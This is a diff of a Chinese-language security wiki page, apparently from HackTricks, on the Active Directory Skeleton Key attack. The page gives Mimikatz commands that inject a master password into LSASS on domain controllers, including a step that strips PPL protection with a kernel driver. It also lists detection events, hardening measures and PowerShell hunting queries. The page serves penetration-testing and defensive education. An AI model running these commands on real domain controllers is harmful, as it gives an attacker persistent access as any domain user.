@@ -4,51 +4,51 @@
 
 ## Skeleton Key Attack
 
-**Skeleton Key attack** 是一种技术，允许攻击者通过将一个主密码注入到每个 domain controller 的 LSASS 进程来**绕过 Active Directory authentication**。注入后，该主密码（默认 **`mimikatz`**）可用于以**any domain user** 身份进行认证，同时他们的真实密码仍然有效。
+**Skeleton Key attack** 是一种通过向每个域控制器的 LSASS 进程中**注入主密码**，从而**绕过 Active Directory authentication** 的技术。注入后，主密码（默认值为 **`mimikatz`**）可用于以**任意域用户**身份进行 authentication，同时这些用户的真实密码仍然有效。<sup>[[1]](#references)[[2]](#references)</sup>
 
-Key facts:
+关键事实：
 
-- 需要在每个 DC 上拥有 **Domain Admin/SYSTEM + SeDebugPrivilege**，并且必须在**每次重启后重新应用**。
-- 会修补 **NTLM** 和 **Kerberos RC4 (etype 0x17)** 的验证路径；仅支持 AES 的域或强制使用 AES 的账户将**不接受 skeleton key**。
-- 可能与第三方 LSA authentication packages 或额外的 smart‑card / MFA providers 存在冲突。
-- Mimikatz 模块接受可选开关 `/letaes`，以在兼容性问题时避免触及 Kerberos/AES 钩子。
+- 需要在每个 DC 上具备 **Domain Admin/SYSTEM + SeDebugPrivilege**，并且必须在**每次重启后重新应用**。<sup>[[2]](#references)</sup>
+- 会修补 **NTLM** 和 **Kerberos RC4 (etype 0x17)** validation paths；仅使用 AES 的 realms 或强制使用 AES 的 accounts 将**无法接受 skeleton key**。<sup>[[2]](#references)</sup>
+- 可能与第三方 LSA authentication packages 或其他 smart-card / MFA providers 发生冲突。<sup>[[2]](#references)</sup>
+- Mimikatz module 接受可选 switch `/letaes`，用于避免修改 Kerberos/AES hooks，以应对兼容性问题。<sup>[[3]](#references)</sup>
 
 ### Execution
 
-经典、非‑PPL 保护的 LSASS:
+经典的、未受 PPL 保护的 LSASS：
 ```text
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
 ```
-如果 **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS)，需要一个内核驱动来在修补 LSASS 之前移除保护：
+如果 **LSASS 以 PPL 运行**（RunAsPPL/Credential Guard/Windows 11 Secure LSASS），则需要内核驱动程序先移除保护，然后才能 patch LSASS：<sup>[[3]](#references)</sup>
 ```text
 mimikatz # privilege::debug
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
 mimikatz # misc::skeleton                               # inject master password 'mimikatz'
 ```
-注入后，使用任意域账户进行身份验证，但使用密码 `mimikatz`（或操作者设置的值）。在多域控制器环境中，记得在**所有 DCs**上重复。
+注入后，使用任意 domain account 进行认证，但密码使用 `mimikatz`（或 operator 设置的值）。请记住，在 multi‑DC 环境中要在 **所有 DCs** 上重复执行。
 
-## 缓解措施
+## Mitigations
 
-- **日志监控**
-- System **Event ID 7045**（服务/驱动安装），针对未签名驱动，例如 `mimidrv.sys`。
-- **Sysmon**：Event ID 7（驱动加载）用于 `mimidrv.sys`；Event ID 10 用于检测来自非系统进程对 `lsass.exe` 的可疑访问。
-- Security **Event ID 4673/4611** 用于检测敏感权限使用或 LSA 身份验证包注册异常；与来自 DCs 的使用 RC4 (etype 0x17) 的异常 4624 登录相关联。
-- **加固 LSASS**
-- 在 DCs 上保持启用 **RunAsPPL/Credential Guard/Secure LSASS**，以迫使攻击者采用内核模式驱动部署（更多遥测，更难被利用）。
-- 尽量禁用旧的 **RC4**；将 Kerberos 票证限制为 AES 可以阻止 skeleton key 使用的 RC4 hook 路径。
-- 快速 PowerShell 搜索：
-- 检测未签名的内核驱动安装： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
-- 查找 Mimikatz 驱动： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
-- 验证重启后是否强制启用 PPL： `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`
+- **Log monitoring**
+- System **Event ID 7045**（service/driver install），用于检测未签名的 drivers，例如 `mimidrv.sys`。
+- **Sysmon**：Event ID 7（driver load），用于检测 `mimidrv.sys`；Event ID 10，用于检测来自非 system processes 对 `lsass.exe` 的可疑访问。
+- Security **Event ID 4673/4611**，用于检测 sensitive privilege use 或 LSA authentication package registration 异常；将其与来自 DCs、使用 RC4（etype 0x17）的异常 4624 logons 进行关联。
+- **Hardening LSASS**
+- 在 DCs 上保持 **RunAsPPL/Credential Guard/Secure LSASS** 启用，迫使 attackers 使用 kernel‑mode driver deployment（提供更多 telemetry，且 exploitation 更困难）。
+- 尽可能禁用 legacy **RC4**；仅限于 AES 的 Kerberos tickets 可阻止 skeleton key 使用的 RC4 hook path。<sup>[[2]](#references)</sup>
+- Quick PowerShell hunts：
+- Detect unsigned kernel driver installs：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
+- Hunt for Mimikatz driver：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
+- Validate PPL is enforced after reboot：`Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`
 
-有关其他凭据加固指导，请查看 [Windows credentials protections](../stealing-credentials/credentials-protections.md)。
+如需其他 credential‑hardening 指南，请查看 [Windows credentials protections](../stealing-credentials/credentials-protections.md)。
 
 ## References
 
-- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
-- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
-- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
+- [1] [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
+- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
+- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
 
 {{#include ../../banners/hacktricks-training.md}}
